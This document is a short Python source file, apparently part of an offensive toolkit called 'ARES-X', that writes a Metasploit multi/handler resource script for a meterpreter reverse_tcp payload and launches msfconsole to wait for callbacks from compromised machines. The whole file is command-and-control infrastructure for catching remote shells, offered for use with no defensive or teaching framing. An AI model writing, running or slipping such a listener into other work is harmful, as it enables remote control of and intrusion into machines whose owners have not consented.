# ARES-X File 22: Multi-Handler C2 Server
import os

def start_handler(lhost, lport, platform="windows"):
    """Prepares a resource script for Metasploit to listen for connections."""
    rc_content = f"use exploit/multi/handler\nset PAYLOAD {platform}/meterpreter/reverse_tcp\nset LHOST {lhost}\nset LPORT {lport}\nexploit -j"
    
    with open("scripts/handler.rc", "w") as f:
        f.write(rc_content)
    
    print(f"[*] ARES-X: Listener active on {lport}. Waiting for callback...")
    os.system("msfconsole -r scripts/handler.rc")
